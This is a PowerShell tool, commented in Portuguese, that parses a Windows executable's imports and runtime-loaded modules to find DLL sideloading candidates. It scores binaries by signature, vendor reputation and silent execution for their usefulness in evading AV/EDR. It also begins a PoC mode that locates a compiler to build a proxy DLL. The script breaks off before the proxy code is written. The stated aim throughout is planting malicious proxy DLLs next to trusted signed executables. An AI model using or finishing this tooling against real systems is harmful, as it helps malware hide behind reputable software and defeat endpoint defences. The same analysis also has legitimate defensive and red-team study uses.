<#
.SYNOPSIS
    Analisa um executavel PE para vulnerabilidade de DLL Sideloading.
    Sideloading = copiar um EXE assinado/confiavel para diretorio controlado
    pelo atacante e colocar uma DLL proxy maliciosa ao lado.
    O objetivo e evasao de AV/EDR usando a reputacao do binario.

.PARAMETER ExePath
    Caminho para o executavel a ser analisado.

.PARAMETER GeneratePoC
    Se informado, copia o EXE para dir temporario e implanta DLL proxy de PoC.

.PARAMETER SideloadDir
    Diretorio onde o EXE sera copiado para teste. Padrao: %TEMP%\sideload_test_<random>

.PARAMETER RuntimeScan
    Executa o alvo por 3s e captura DLLs carregadas em runtime via modulos do processo.

.PARAMETER InteractiveScan
    Abre o alvo normalmente para que voce interaja. Monitora DLLs em tempo real pelo
    tempo definido em -ScanSeconds (padrao 30s), depois fecha o processo e lista tudo.

.PARAMETER ScanSeconds
    Duracao em segundos do scan interativo (padrao: 30). Usado com -InteractiveScan.

.EXAMPLE
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe"
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -RuntimeScan
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -InteractiveScan
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -RuntimeScan -GeneratePoC
    .\Check-DllSideloading.ps1 -ExePath "C:\app\target.exe" -GeneratePoC -SideloadDir "C:\Users\attacker\Desktop"
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory=$true, Position=0)]
    [string]$ExePath,
    [switch]$GeneratePoC,
    [string]$SideloadDir = "",
    [switch]$RuntimeScan,
    [switch]$InteractiveScan,
    [int]$ScanSeconds = 30
)

# --- Output helpers -----------------------------------------------------------
function Write-Banner {
    Write-Host ""
    Write-Host "  +==============================================================+" -ForegroundColor Cyan
    Write-Host "  |       DLL Sideloading Analyzer  +  PoC Generator             |" -ForegroundColor Cyan
    Write-Host "  +==============================================================+" -ForegroundColor Cyan
    Write-Host ""
}
function Write-Section([string]$t) { Write-Host ""; Write-Host "  [*] $t" -ForegroundColor Yellow }
function Write-Ok([string]$m)      { Write-Host "      [+] $m" -ForegroundColor Green  }
function Write-Bad([string]$m)     { Write-Host "      [-] $m" -ForegroundColor Red    }
function Write-Warn([string]$m)    { Write-Host "      [!] $m" -ForegroundColor Yellow }
function Write-Info([string]$m)    { Write-Host "          $m" -ForegroundColor Gray   }

Write-Banner

# --- Validacao ----------------------------------------------------------------
if (-not (Test-Path $ExePath)) {
    Write-Host "  [ERRO] Arquivo nao encontrado: $ExePath" -ForegroundColor Red; exit 1
}
$ExePath = (Resolve-Path $ExePath).Path
$ExeDir  = Split-Path $ExePath -Parent
$ExeName = Split-Path $ExePath -Leaf
[byte[]]$bytes = [System.IO.File]::ReadAllBytes($ExePath)

# --- Parse PE -----------------------------------------------------------------
$peOff   = [BitConverter]::ToInt32($bytes, 0x3C)
$sig     = [System.Text.Encoding]::ASCII.GetString($bytes, $peOff, 2)
if ($sig -ne "PE") { Write-Host "  [ERRO] Nao e um PE valido." -ForegroundColor Red; exit 1 }

$machine     = [BitConverter]::ToUInt16($bytes, $peOff + 4)
$numSec      = [BitConverter]::ToUInt16($bytes, $peOff + 6)
$optMagic    = [BitConverter]::ToUInt16($bytes, $peOff + 24)
$dllChars    = [BitConverter]::ToUInt16($bytes, $peOff + 24 + 70)
$optHdrSz    = [BitConverter]::ToUInt16($bytes, $peOff + 20)
$secStart    = $peOff + 24 + $optHdrSz
$arch        = if ($optMagic -eq 0x20B) { "PE32+ (x64)" } else { "PE32 (x86)" }
$ddBase      = $peOff + 24 + $(if ($optMagic -eq 0x20B) { 112 } else { 96 })

function ConvertTo-FileOffset([uint32]$rva) {
    for ($i = 0; $i -lt $numSec; $i++) {
        $s   = $secStart + $i * 40
        $va  = [BitConverter]::ToUInt32($bytes, $s + 12)
        $vs  = [BitConverter]::ToUInt32($bytes, $s + 16)
        $raw = [BitConverter]::ToUInt32($bytes, $s + 20)
        if ($rva -ge $va -and $rva -lt ($va + $vs)) { return [int]($raw + $rva - $va) }
    }
    return -1
}

function Read-NullTermString([int]$off) {
    $sb = New-Object System.Text.StringBuilder
    while ($off -lt $bytes.Length -and $bytes[$off] -ne 0) {
        [void]$sb.Append([char]$bytes[$off]); $off++
    }
    return $sb.ToString()
}

# --- Import Table -------------------------------------------------------------
function Get-ImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*20 + 12)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# --- Delay Import Table ------------------------------------------------------
function Get-DelayImportDlls {
    $out = [System.Collections.Generic.List[string]]::new()
    $rva = [BitConverter]::ToUInt32($bytes, $ddBase + 13*8)
    if ($rva -eq 0) { return ,$out }
    $off = ConvertTo-FileOffset $rva
    if ($off -lt 0) { return ,$out }
    $idx = 0
    while ($true) {
        $nameRVA = [BitConverter]::ToUInt32($bytes, $off + $idx*32 + 4)
        if ($nameRVA -eq 0) { break }
        $nameOff = ConvertTo-FileOffset $nameRVA
        if ($nameOff -lt 0) { break }
        $out.Add((Read-NullTermString $nameOff))
        $idx++
    }
    return ,$out
}

# --- KnownDLLs (carregados sempre do System32 via cache, nao do app dir) -----
function Get-KnownDlls {
    $known = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
    try {
        $props = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs" -EA Stop
        foreach ($p in $props.PSObject.Properties) {
            if ($p.Name -like 'PS*') { continue }
            if ($p.Value -is [string] -and $p.Value -ne '') { [void]$known.Add($p.Value) }
        }
    } catch {}
    return ,$known
}

# --- Manifest -----------------------------------------------------------------
function Get-EmbeddedManifest {
    $rsrcRVA  = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8)
    $rsrcSize = [BitConverter]::ToUInt32($bytes, $ddBase + 2*8 + 4)
    if ($rsrcRVA -eq 0) { return $null }
    $rsrcOff = ConvertTo-FileOffset $rsrcRVA
    $end     = [Math]::Min($rsrcOff + [int]$rsrcSize, $bytes.Length - 5)
    for ($i = $rsrcOff; $i -lt $end; $i++) {
        if ($bytes[$i] -eq 0x3C -and $bytes[$i+1] -eq 0x3F) {
            $xml = [System.Text.Encoding]::UTF8.GetString($bytes, $i, [Math]::Min(800, $bytes.Length - $i))
            if ($xml.StartsWith("<?xml")) { return $xml }
        }
    }
    return $null
}

# --- P/Invoke EnumProcessModulesEx -------------------------------------------
if (-not ([System.Management.Automation.PSTypeName]'NativeModEnum').Type) {
    Add-Type -TypeDefinition @'
using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
public class NativeModEnum {
    const int PROCESS_QUERY_INFORMATION = 0x0400;
    const int PROCESS_VM_READ           = 0x0010;
    const int LIST_MODULES_ALL          = 0x03;
    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr OpenProcess(int access, bool inherit, int pid);
    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr h);
    [DllImport("psapi.dll", SetLastError=true)]
    static extern bool EnumProcessModulesEx(IntPtr hProc, IntPtr[] mods, int cb, out int needed, int filter);
    [DllImport("psapi.dll", CharSet=CharSet.Unicode)]
    static extern int GetModuleFileNameEx(IntPtr hProc, IntPtr hMod, StringBuilder buf, int sz);
    public static string[] GetModuleNames(int pid) {
        IntPtr h = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, pid);
        if (h == IntPtr.Zero) return new string[0];
        try {
            int needed = 0;
            EnumProcessModulesEx(h, null, 0, out needed, LIST_MODULES_ALL);
            if (needed == 0) return new string[0];
            IntPtr[] arr = new IntPtr[needed / IntPtr.Size];
            if (!EnumProcessModulesEx(h, arr, needed, out needed, LIST_MODULES_ALL))
                return new string[0];
            int count = needed / IntPtr.Size;
            var names = new List<string>(count);
            var sb = new StringBuilder(512);
            for (int i = 0; i < count; i++) {
                sb.Length = 0;
                if (GetModuleFileNameEx(h, arr[i], sb, 512) > 0)
                    names.Add(System.IO.Path.GetFileName(sb.ToString()));
            }
            return names.ToArray();
        } finally { CloseHandle(h); }
    }
}
'@
}

# --- Runtime DLL Monitor -----------------------------------------------------
function Get-RuntimeLoadedDlls {
    param([string]$exePath, [int]$waitMs = 3000)
    $result = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop
        if (-not $proc) { return ,$result }
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $waitMs) {
            try {
                foreach ($n in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    [void]$result.Add($n)
                }
            } catch {}
            if ($proc.HasExited) { break }
            Start-Sleep -Milliseconds 300
        }
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch {}
    return ,$result
}

function Get-InteractiveRuntimeDlls {
    param([string]$exePath, [int]$seconds = 30)
    $result = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase)
    try {
        $proc = Start-Process -FilePath $exePath -PassThru -EA Stop
        if (-not $proc) { return ,$result }
        $totalMs = $seconds * 1000
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while ($sw.ElapsedMilliseconds -lt $totalMs) {
            $remaining = [int](($totalMs - $sw.ElapsedMilliseconds) / 1000) + 1
            $newDlls = [System.Collections.Generic.List[string]]::new()
            try {
                foreach ($n in [NativeModEnum]::GetModuleNames($proc.Id)) {
                    if ($result.Add($n)) { $newDlls.Add($n) }
                }
            } catch {}
            if ($newDlls.Count -gt 0) {
                Write-Host ""
                foreach ($d in $newDlls) {
                    Write-Host ("  [+] $d") -ForegroundColor Green
                }
                Write-Host ("  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $result.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            } else {
                Write-Host ("`r  [{0,3}s] {1,3} DLL(s) capturadas" -f $remaining, $result.Count) `
                    -NoNewline -ForegroundColor DarkCyan
            }
            if ($proc.HasExited) {
                Write-Host "`n  [!] Processo encerrado pelo usuario." -ForegroundColor Yellow
                return ,$result
            }
            Start-Sleep -Milliseconds 500
        }
        Write-Host ""
        if (-not $proc.HasExited) { $proc.Kill(); [void]$proc.WaitForExit(2000) }
    } catch { Write-Host "" }
    return ,$result
}

# --- Coleta -------------------------------------------------------------------
Write-Host "  Analisando PE..." -ForegroundColor DarkGray

[System.Collections.Generic.List[string]]$staticDlls = Get-ImportDlls
[System.Collections.Generic.List[string]]$delayDlls  = Get-DelayImportDlls
$knownDlls   = Get-KnownDlls
$manifest    = Get-EmbeddedManifest

# Runtime scan: executa alvo no diretorio ORIGINAL e captura modulos
$runtimeDlls = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)
if ($RuntimeScan) {
    Write-Host "  Executando alvo por 3s para capturar DLLs runtime..." -ForegroundColor DarkGray
    $runtimeDlls = Get-RuntimeLoadedDlls $ExePath 3000
    Write-Host "  $($runtimeDlls.Count) modulos capturados em runtime." -ForegroundColor DarkGray
}

if ($InteractiveScan) {
    Write-Host ""
    Write-Host "  --- SCAN INTERATIVO -------------------------------------------------" -ForegroundColor Cyan
    Write-Host "  Abrindo '$ExeName' -- interaja normalmente com o programa." -ForegroundColor Cyan
    Write-Host "  Sera fechado automaticamente em $ScanSeconds segundo(s)." -ForegroundColor Cyan
    Write-Host "  Dica: navegue menus, abra dialogs, use funcoes para capturar mais DLLs." -ForegroundColor DarkCyan
    Write-Host "  ---------------------------------------------------------------------" -ForegroundColor Cyan
    Write-Host ""
    $interDlls = Get-InteractiveRuntimeDlls $ExePath $ScanSeconds
    foreach ($d in $interDlls) { [void]$runtimeDlls.Add($d) }
    Write-Host "  Scan encerrado: $($runtimeDlls.Count) DLL(s) unicas acumuladas." -ForegroundColor Green
}

# Junta todos os DLLs sem duplicatas (ordem: delay > static > runtime-only)
$allDllsSet  = [System.Collections.Generic.LinkedList[string]]::new()
$allDllsSeen = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::OrdinalIgnoreCase)

foreach ($d in $delayDlls)  { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $staticDlls) { if ($allDllsSeen.Add($d)) { [void]$allDllsSet.AddLast($d) } }
foreach ($d in $runtimeDlls) {
    if ($d -ne [System.IO.Path]::GetFileName($ExePath) -and $allDllsSeen.Add($d)) {
        [void]$allDllsSet.AddLast($d)
    }
}

# --- Classificar candidatas para sideloading ----------------------------------
# Em sideloading, o atacante controla o diretorio.
# Qualquer DLL que NAO seja KnownDLL e que exista no sistema e candidata a proxy.
# KnownDLLs sao sempre carregadas do System32 (cache do loader), nao importa
# de onde o EXE execute -- por isso sao filtradas.
$apiSetPrefixes = @("api-ms-win-","ext-ms-win-","api-ms-onecoreuap-")

$highRisk = [System.Collections.Generic.HashSet[string]]::new(
    [string[]]@('VERSION.dll','MSIMG32.dll','NETAPI32.dll','WININET.dll',
                'PSAPI.DLL','IPHLPAPI.DLL','WINTRUST.dll','credui.dll',
                'WTSAPI32.dll','COMCTL32.dll','WSOCK32.dll','USERENV.dll',
                'CRYPT32.dll','imagehlp.dll','WINMM.dll','UxTheme.dll',
                'oledlg.dll','OLEACC.dll','WINSPOOL.DRV'),
    [System.StringComparer]::OrdinalIgnoreCase)

$vulnList = [System.Collections.Generic.List[PSCustomObject]]::new()

foreach ($dll in $allDllsSet) {
    # Pular API sets (resolvidos pelo loader)
    $isApiSet = $false
    foreach ($prefix in $apiSetPrefixes) {
        if ($dll.ToLower().StartsWith($prefix)) { $isApiSet = $true; break }
    }
    if ($isApiSet) { continue }

    # Pular KnownDLLs (bypass search order via cache)
    if ($knownDlls.Contains($dll)) { continue }

    $type = if   ($delayDlls.Contains($dll))   { "Delay" }
            elseif ($runtimeDlls.Contains($dll) -and
                    -not $staticDlls.Contains($dll) -and
                    -not $delayDlls.Contains($dll)) { "Runtime" }
            else { "Static" }

    # Verificar se a DLL original existe no sistema (precisa existir para proxy)
    $origPath = $null
    $sysSearchPaths = @(
        [System.IO.Path]::Combine($env:SystemRoot, "System32"),
        [System.IO.Path]::Combine($env:SystemRoot, "SysWOW64")
    )
    foreach ($sp in $sysSearchPaths) {
        $candidate = [System.IO.Path]::Combine($sp, $dll)
        if ([System.IO.File]::Exists($candidate)) { $origPath = $candidate; break }
    }
    # Tambem buscar no diretorio original do app (DLLs proprietarias)
    $appCopy = [System.IO.Path]::Combine($ExeDir, $dll)
    $inAppDir = [System.IO.File]::Exists($appCopy)
    if (-not $origPath -and $inAppDir) { $origPath = $appCopy }

    $risk = if ($highRisk.Contains($dll)) { "ALTO" } else { "MEDIO" }
    $origin = if ($inAppDir) { "AppDir" } elseif ($origPath) { "System" } else { "NaoEncontrada" }

    if ($origPath) {
        $vulnList.Add([PSCustomObject]@{
            Name=$dll; Type=$type; Risk=$risk; Origin=$origin; OrigPath=$origPath
        })
    }
    # DLLs que nao existem no sistema nao sao uteis para sideloading
    # (sem original = sem proxy = app crasha = ruim para evasao)
}

# Ordena: ALTO primeiro, depois Delay > Runtime > Static
$typeOrd = @{ "Delay"=0; "Runtime"=1; "Static"=2 }
$vulnSorted = @($vulnList | Sort-Object { if ($_.Risk -eq "ALTO") { 0 } else { 1 } }, { $typeOrd[$_.Type] })

# --- Protecoes ----------------------------------------------------------------
$hasAslr   = ($dllChars -band 0x0040) -ne 0
$hasDep    = ($dllChars -band 0x0100) -ne 0
$hasGs     = $false
$lcRVA     = [BitConverter]::ToUInt32($bytes, $ddBase + 10*8)
if ($lcRVA -ne 0) {
    $lcOff = ConvertTo-FileOffset $lcRVA
    if ($lcOff -ge 0) {
        $hasGs = [BitConverter]::ToUInt32($bytes, $lcOff + 60) -ne 0
    }
}

$privLevel = "desconhecido"
if ($manifest -match "requestedExecutionLevel level='([^']+)'") { $privLevel = $Matches[1] }

$sigInfo = try {
    $s = Get-AuthenticodeSignature $ExePath -EA Stop
    @{ Status=$s.Status.ToString(); Signer=$s.SignerCertificate.Subject; Cert=$s.SignerCertificate }
} catch { @{ Status="Erro"; Signer=""; Cert=$null } }
$isSigned = $sigInfo.Status -eq "Valid"

# --- RELATORIO ----------------------------------------------------------------
Write-Section "ALVO"
Write-Info "Arquivo      : $ExeName"
Write-Info "Tamanho      : $([math]::Round($bytes.Length/1KB,1)) KB"
Write-Info "Arquitetura  : $arch"
Write-Info "Privilegio   : $privLevel"
Write-Info "Diretorio    : $ExeDir"

Write-Section "PROTECOES BINARIAS"
if ($hasAslr) {
    Write-Ok "ASLR (DYNAMIC_BASE)"
} else {
    Write-Bad "ASLR desabilitado"
    Write-Info "  Correcao: link /DYNAMICBASE programa.obj"
}
if ($hasDep) {
    Write-Ok "DEP/NX (NX_COMPAT)"
} else {
    Write-Bad "DEP/NX desabilitado"
    Write-Info "  Correcao: link /NXCOMPAT programa.obj"
}
if ($hasGs) {
    Write-Ok "Stack Canary (/GS)"
} else {
    Write-Bad "Stack Canary ausente (/GS-)"
    Write-Info "  Correcao: cl /GS programa.c"
}
if ($isSigned) {
    Write-Ok "Authenticode: $($sigInfo.Status)  [$($sigInfo.Signer)]"
} else {
    Write-Bad "Authenticode: $($sigInfo.Status)"
    Write-Info "  Correcao: signtool sign /f certificado.pfx /p senha /tr http://timestamp.digicert.com /td sha256 /fd sha256 programa.exe"
}

# --- Atratividade para Sideloading -------------------------------------------
Write-Section "ATRATIVIDADE PARA SIDELOADING"
Write-Info "Cenario: copiar $ExeName para diretorio controlado + DLL proxy ao lado"
Write-Info "Objetivo: executar payload usando reputacao do binario para bypass de AV/EDR"
Write-Host ""

$score = 0
$maxScore = 4

# 1. Assinatura valida = confianca do AV
if ($isSigned) {
    Write-Ok "Binario ASSINADO -- AV/EDR tende a confiar na execucao"
    $score++
    # Verificar se e vendor conhecido
    $trustedVendors = @("Microsoft","Adobe","Google","Oracle","Java","VMware","Citrix",
                        "Cisco","Intel","NVIDIA","AMD","Symantec","McAfee","Trend Micro")
    $isTrustedVendor = $false
    foreach ($v in $trustedVendors) {
        if ($sigInfo.Signer -match $v) { $isTrustedVendor = $true; break }
    }
    if ($isTrustedVendor) {
        Write-Ok "Signatario de vendor CONHECIDO -- alta reputacao"
        $score++
    } else {
        Write-Warn "Signatario de vendor desconhecido -- reputacao variavel"
    }
} else {
    Write-Bad "Binario NAO assinado -- pouco util para sideloading (sem bypass de AV)"
}

# 2. DLLs exploraveis
if ($vulnSorted.Count -gt 0) {
    Write-Ok "$($vulnSorted.Count) DLL(s) candidatas para proxy (fora de KnownDLLs)"
    $score++
} else {
    Write-Bad "Nenhuma DLL candidata -- todas sao KnownDLLs"
}

# 3. Privilegio
if ($privLevel -eq "requireAdministrator" -or $privLevel -eq "highestAvailable") {
    Write-Warn "Requer elevacao ($privLevel) -- pode triggerar UAC prompt"
} else {
    Write-Ok "Nao requer elevacao -- executa silenciosamente"
    $score++
}

# Score final
$rating = switch ($score) {
    { $_ -ge 4 } { "EXCELENTE" }
    3             { "BOM" }
    2             { "MODERADO" }
    1             { "BAIXO" }
    default       { "INVIAVEL" }
}
$ratingColor = switch ($score) {
    { $_ -ge 3 } { "Green" }
    2             { "Yellow" }
    default       { "Red" }
}
Write-Host ""
Write-Host "      Score de atratividade: $score/$maxScore ($rating)" -ForegroundColor $ratingColor

# --- DLLs importadas ---------------------------------------------------------
Write-Section "DLLs IMPORTADAS"
Write-Info "Import estatico : $($staticDlls.Count) DLL(s)"
Write-Info "Delay Import    : $($delayDlls.Count) DLL(s)  [carregadas via LoadLibrary() em runtime]"
if ($RuntimeScan -or $InteractiveScan) {
    $rtOnly = @($runtimeDlls | Where-Object {
        -not $staticDlls.Contains($_) -and -not $delayDlls.Contains($_) }).Count
    $scanLabel = if ($RuntimeScan -and $InteractiveScan) { "Runtime+Interativo" }
                 elseif ($InteractiveScan) { "Interativo($ScanSeconds" + "s)" }
                 else { "Runtime (proc)" }
    Write-Info "$($scanLabel.PadRight(16)): $($runtimeDlls.Count) DLL(s) capturadas  [$rtOnly exclusivamente runtime]"
}

# --- Analise de Sideloading ---------------------------------------------------
Write-Section "ANALISE -- DLL SIDELOADING"
Write-Info "Como funciona:"
Write-Info "  1. Atacante copia $ExeName para diretorio controlado (ex: %TEMP%)"
Write-Info "  2. Coloca DLL proxy (maliciosa) ao lado do EXE"
Write-Info "  3. EXE busca DLL primeiro no proprio diretorio -> carrega a proxy"
Write-Info "  4. Proxy faz forward dos exports para original -> app funciona normal"
Write-Info "  5. Payload executa no contexto do processo assinado -> bypass AV"
Write-Host ""
Write-Info "KnownDLLs ($(($knownDlls | Measure-Object).Count)) sao carregadas do cache do OS -- NAO podem ser sideloaded"
Write-Host ""

if ($vulnSorted.Count -eq 0) {
    Write-Ok "Nenhuma DLL candidata para sideloading (todas sao KnownDLLs ou API sets)."
    exit 0
}

Write-Warn "$($vulnSorted.Count) DLL(s) candidatas para sideloading:"
Write-Host ""
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4,-14} {5}" -f "#","DLL","Tipo","Risco","Origem","Nota") -ForegroundColor DarkCyan
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4,-14} {5}" -f "----",("---"*8),("---"*5),("---"*2),("---"*4),("---"*7)) -ForegroundColor DarkGray

for ($i = 0; $i -lt $vulnSorted.Count; $i++) {
    $v     = $vulnSorted[$i]
    $tipo  = switch ($v.Type) { "Delay" {"Delay Import"} "Runtime" {"Runtime Load"} default {"Static Import"} }
    $nota  = if ($highRisk.Contains($v.Name)) { "Comumente explorada" } elseif ($v.Type -eq "Runtime") { "Carregada em runtime" } else { "" }
    $color = switch ($v.Type) {
        "Runtime" { if ($v.Risk -eq "ALTO") { "Magenta" } else { "Cyan" } }
        default   { if ($v.Risk -eq "ALTO") { "Red" }     else { "Yellow" } }
    }
    Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4,-14} {5}" -f ($i+1), $v.Name, $tipo, $v.Risk, $v.Origin, $nota) -ForegroundColor $color
}

if (-not $GeneratePoC) {
    Write-Host ""
    Write-Host "  Execute com  -RuntimeScan         para capturar DLLs de inicializacao (3s auto).
  Execute com  -InteractiveScan      para interagir e capturar DLLs em tempo real.
  Adicione     -ScanSeconds N        para definir duracao do scan interativo.
  Execute com  -GeneratePoC          para copiar EXE + implantar DLL proxy em dir temporario.
  Adicione     -SideloadDir PATH     para definir diretorio de sideloading." -ForegroundColor DarkYellow
    exit 0
}

# --- SELETOR INTERATIVO DE DLL ALVO ------------------------------------------
Write-Host ""
Write-Host "  +==============================================================+" -ForegroundColor Cyan
Write-Host "  |     SELECIONE A DLL PARA VALIDACAO DE SIDELOADING            |" -ForegroundColor Cyan
Write-Host "  +==============================================================+" -ForegroundColor Cyan
Write-Host ""
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f "#","DLL","Tipo","Risco","Nota") -ForegroundColor DarkCyan
Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f "----",("---"*8),("---"*5),("---"*2),("---"*7)) -ForegroundColor DarkGray

for ($i = 0; $i -lt $vulnSorted.Count; $i++) {
    $v     = $vulnSorted[$i]
    $tipo  = switch ($v.Type) { "Delay" {"Delay Import"} "Runtime" {"Runtime Load"} default {"Static Import"} }
    $nota  = if ($highRisk.Contains($v.Name)) { "Comumente explorada" } elseif ($v.Type -eq "Runtime") { "Carregada em runtime" } else { "" }
    $color = if ($v.Risk -eq "ALTO") { "Red" } else { "Yellow" }
    Write-Host ("  {0,4}  {1,-26} {2,-16} {3,-8} {4}" -f ($i+1), $v.Name, $tipo, $v.Risk, $nota) -ForegroundColor $color
}

Write-Host ""
Write-Host "  N   = testa apenas a DLL de numero N" -ForegroundColor DarkYellow
Write-Host "  #N  = testa todas a partir de N ate encontrar uma vulneravel" -ForegroundColor DarkYellow
Write-Host "  Enter = testa apenas a #1" -ForegroundColor DarkYellow
do {
    $raw = Read-Host "  Selecao"
    if ([string]::IsNullOrWhiteSpace($raw)) { $raw = "1" }
    $raw = $raw.Trim()
    $scanAll = $raw.StartsWith("#")
    $numStr  = if ($scanAll) { $raw.Substring(1).Trim() } else { $raw }
    $selIdx  = 0
    $valid   = [int]::TryParse($numStr, [ref]$selIdx) -and $selIdx -ge 1 -and $selIdx -le $vulnSorted.Count
    if (-not $valid) {
        Write-Host "  [!] Entrada invalida. Use um numero (ex: 2) ou #numero (ex: #2)." -ForegroundColor Yellow
    }
} while (-not $valid)

if ($scanAll) {
    $tryOrder = @($vulnSorted[($selIdx-1)..($vulnSorted.Count-1)])
} else {
    $tryOrder = @($vulnSorted[$selIdx-1])
}

# --- FUNCOES ------------------------------------------------------------------
function Get-DllExportNames([string]$path) {
    $out = [System.Collections.Generic.List[string]]::new()
    if (-not (Test-Path $path)) { return ,$out }
    [byte[]]$b = [System.IO.File]::ReadAllBytes($path)
    $pe2  = [BitConverter]::ToInt32($b, 0x3C)
    $mag2 = [BitConverter]::ToUInt16($b, $pe2 + 24)
    $ns2  = [BitConverter]::ToUInt16($b, $pe2 + 6)
    $opt2 = [BitConverter]::ToUInt16($b, $pe2 + 20)
    $ss2  = $pe2 + 24 + $opt2
    $dd2  = $pe2 + 24 + $(if ($mag2 -eq 0x20B) { 112 } else { 96 })
    function Rva2Off([uint32]$rva) {
        for ($k = 0; $k -lt $ns2; $k++) {
            $s = $ss2 + $k*40
            $va  = [BitConverter]::ToUInt32($b, $s+12)
            $vsz = [BitConverter]::ToUInt32($b, $s+16)
            $raw = [BitConverter]::ToUInt32($b, $s+20)
            if ($rva -ge $va -and $rva -lt ($va+$vsz)) { return [int]($raw+$rva-$va) }
        }; return -1
    }
    $expRVA = [BitConverter]::ToUInt32($b, $dd2)
    if ($expRVA -eq 0) { return ,$out }
    $expOff = Rva2Off $expRVA
    if ($expOff -lt 0) { return ,$out }
    $numNames   = [BitConverter]::ToUInt32($b, $expOff + 24)
    $nameTabRVA = [BitConverter]::ToUInt32($b, $expOff + 32)
    $nameTabOff = Rva2Off $nameTabRVA
    for ($i = 0; $i -lt [int]$numNames; $i++) {
        $nrva = [BitConverter]::ToUInt32($b, $nameTabOff + $i*4)
        $noff = Rva2Off $nrva
        if ($noff -lt 0) { continue }
        $sb = New-Object System.Text.StringBuilder
        $j = $noff
        while ($j -lt $b.Length -and $b[$j] -ne 0) { [void]$sb.Append([char]$b[$j]); $j++ }
        $out.Add($sb.ToString())
    }
    return ,$out
}

function Find-Compiler {
    $vswhere = "${env:ProgramFiles(x86)}\Microsoft Visual Studio\Installer\vswhere.exe"
    if (Test-Path $vswhere) {
        $vsPath = (& $vswhere -latest -products * -property installationPath 2>$null) | Select-Object -First 1
        if ($vsPath) {
            $vcvars = Get-ChildItem "$vsPath\VC\Auxiliary\Build" -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
            $cl     = Get-ChildItem "$vsPath\VC\Tools\MSVC" -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                      Where-Object { $_.FullName -match "Hostx64.x86|Hostx86.x86" } | Select-Object -First 1
            if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
        }
    }
    $candidates = @(
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx64\x86" },
        @{ vsbase="${env:ProgramFiles(x86)}\Microsoft Visual Studio\2019"; host="Hostx86\x86" },
        @{ vsbase="${env:ProgramFiles}\Microsoft Visual Studio\2022";       host="Hostx64\x86" }
    )
    foreach ($c in $candidates) {
        if (-not (Test-Path $c.vsbase)) { continue }
        $vcvars = Get-ChildItem $c.vsbase -Recurse -Filter "vcvars32.bat" -EA SilentlyContinue | Select-Object -First 1
        $cl     = Get-ChildItem $c.vsbase -Recurse -Filter "cl.exe" -EA SilentlyContinue |
                  Where-Object { $_.FullName -match ($c.host -replace "\\",".") } | Select-Object -First 1
        if ($cl -and $vcvars) { return @{ Type="MSVC"; Path=$cl.FullName; Vcvars=$vcvars.FullName } }
    }
    foreach ($gcc in @("gcc.exe","i686-w64-mingw32-gcc.exe","x86_64-w64-mingw32-gcc.exe")) {
        $gccCmd = Get-Command $gcc -EA SilentlyContinue
        if ($gccCmd) { return @{ Type="GCC"; Path=$gccCmd.Source; Vcvars=$null } }
    }
    return $null
}

function Test-VulnDll {
    param([string]$exePath, [string]$evtName, [int]$waitSec = 6)
    $evt = $null
    try {
        $evt  = [System.Threading.EventWaitHandle]::new(
            $false, [System.Threading.EventResetMode]::ManualReset, $evtName)
        $proc = $null
        try { $proc = Start-Process -FilePath $exePath -PassThru -WindowStyle Minimized -EA Stop } catch { return $false }
        $signaled = $evt.WaitOne($waitSec * 1000)
        if ($proc -and -not $proc.HasExited) { try { $proc.Kill(); [void]$proc.WaitForExit(2000) } catch {} }
        return $signaled
    } finally {
        if ($evt) { $evt.Dispose() }
    }
}

# --- COMPILADOR ---------------------------------------------------------------
$compiler = Find-Compiler
if (-not $compiler) {
    Write-Bad "Nenhum compilador encontrado (cl.exe / gcc). Instale MinGW ou Visual Studio."
    exit 0
}
Write-Ok "Compilador : $($compiler.Type)  ->  $($compiler.Path)"

# --- Preparar diretorio de sideloading ---------------------------------------
